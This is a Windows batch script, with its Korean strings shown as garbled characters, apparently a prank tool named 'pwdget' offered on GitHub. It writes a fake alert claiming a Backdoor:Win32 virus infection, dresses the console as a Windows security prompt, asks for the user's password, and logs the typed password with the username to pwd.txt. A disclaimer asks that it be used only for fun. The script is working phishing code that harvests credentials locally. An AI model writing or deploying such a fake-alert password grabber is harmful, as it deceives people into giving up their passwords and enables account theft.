@echo off
set version=1.2
if not exist "pwdget" goto setup
cd pwdget
if not exist "msgfile" goto restoremode
echo [               %date% %time%               ] >> log.txt
echo. >> log.txt
echo [ %date% %time% ] ���� üũ��.. >> log.txt
echo [ %date% %time% ] ���� üũ�Ϸ� >> log.txt

:start
echo [ %date% %time% ] ���� üũ��.. >> log.txt
if not exist "log.txt" goto error
echo [ %date% %time% ] ���� üũ�Ϸ� : log.txt >> log.txt
if not exist "pwd.txt" goto error
echo [ %date% %time% ] ���� üũ�Ϸ� : pwd.txt >> log.txt
if not exist "msgfile/error.vbs" goto error
echo [ %date% %time% ] ���� üũ�Ϸ� : error.vbs >> log.txt
if not exist "msgfile/info.vbs" goto error
echo [ %date% %time% ] ���� üũ�Ϸ� : info.vbs >> log.txt
echo [ %date% %time% ] ���� ��ü üũ�Ϸ� : {log.txt, pwd.txt, error.vbs, info.vbs} >> log.txt
start msgfile/info.vbs
echo [ %date% %time% ] ���� ���� : info.vbs >> log.txt
cls
echo [ %date% %time% ]:  ���α׷� ����Ϸ� (���� ����: %version% / ���: %cd% / ����ڸ�: %USERNAME%) >> log.txt
color a
title [Windows ����] �۾��� �ʿ��մϴ�.
set /p a=��й�ȣ(Password)�� �Է����ּ���: 
echo [               %date% %time%               ] >> pwd.txt
echo [ %date% %time% ]: %a% (%USERNAME%) >> pwd.txt
goto exit

:setup
color b
echo %username%��! ���α׷� ����� ȯ���ؿ�!
echo.
echo !! �� ���α׷��� �ǿ��ϸ� ������ �ɼ� �ִ� ���α׷��Դϴ�. !!
echo !! ����� �����߻��� ��� ����å���̹Ƿ� Ȯ���� ����ϼ���. (github Readme.md���� ����) !!
echo !!  ������ ��й�ȣ�� �˾Ƴ��⺸�ٴ� ��̷θ� ������ֽñ� �ٶ��ϴ� !!
set /p a=���� ���뿡 ���� �Ͻó���? ���ǰźν� ���α׷��� ����ϽǼ� �����ϴ�. (y/n): 
if %a%==exit goto exit
if %a%==y goto setupyes
if %a%==yes goto setupyes
if %a%==ye goto setupyes
if %a%==agree goto setupyes
if %a%==n goto exit
if %a%==no goto exit
if %a%==nope goto exit
if %a%==disagree goto exit

:setupyes
md pwdget
cd pwdget
md msgfile
cls
echo [ ��й�ȣ ����: [ ��¥ �ð� ]: ��й�ȣ (������̸�-��ü) ] >> pwd.txt
echo MsgBox "�ش��ο� ���α׷� ��ġ�� �Ϸ�Ǿ����! ��θ� Ȯ���ϼ���!: %cd%", 8, "���α׷� ��ġ�Ϸ�" >> msgfile/setupfinish.vbs
echo MsgBox "���� �� ��ǻ�Ϳ� ���̷��� Backdoor:Win32 (��)�� ����ǰ� �ִ°��� Ȯ�εǾ����ϴ�. �ڵ����� ���� �Ϸ��Ͽ�����, �����ڱ���(UACPerm)�� �����Ͽ� �۾������� ���� ����� ���� ��й�ȣ�� �Է����ּ���. �� â�� ���°�� ������ �Ұ��� �� �� �ֽ��ϴ�.", 16, "����" >> msgfile/info.vbs
echo MsgBox "�˼����� ������ �߻��߾��..", 16, "������ �߻��߾��!" >> msgfile/error.vbs
echo [ ��ġ�ð�: %date% %time% ] >> info.txt
echo * ���α׷��� �����Ϸ��� ���α׷� ���� (��ġ����)���� "pwdget" ������ �����Ͻø� �˴ϴ�! >> info.txt
echo * �ǿ����� ���� å���� ��� ���ο��� ������ �˸��ϴ�. >> info.txt
echo * �ʱ⼳��â�� %temp%\pwdgen�� �ִ°�� ǥ�õ��� �ʰ� pwdget��尡 ����˴ϴ�. >> info.txt
start msgfile/setupfinish.vbs
goto exit

:restoremode
cls
echo [ ������� ]
echo.
echo ������� ���ϻ����� ������ �߻��߽��ϴ�,
echo ���� ������ �ٽ� ��ġ�ؾ��մϴ�. (log.txt, pwd.txt�� �����˴ϴ�.)
set /p a=����ұ��? (y/n): 
if %a%==y goto restorestart
if %a%==n goto exit
if %a%==yes goto restorestart
if %a%==no goto exit

:restorestart
set /p a=pwdget �������� ������ ��� �����˴ϴ�. ������ �����Ͻǰǰ���? (y/n): 
if %a%==y goto restorestart2
if %a%==n goto exit
if %a%==yes goto restorestart2
if %a%==no goto exit

:restorestart2
cls
cd..
del pwdget
cls
goto setup

:error
cls
echo [ %date% %time% ] ���α׷� ������ ������ �߻��߾��. ����� �̽��� �����ϰų� �ֽŹ��� �ٿ�ε�, ���������� �ٽ� �����غ�����! >> log.txt
echo [ %date% %time% ] ���� ����Ϸ� : error.vbs >> log.txt
start msgfile/error.vbs
goto exit

:exit
cls
echo [ %date% %time% ] ���α׷��� ����Ǿ����ϴ�. (����: %version%) >> log.txt
exit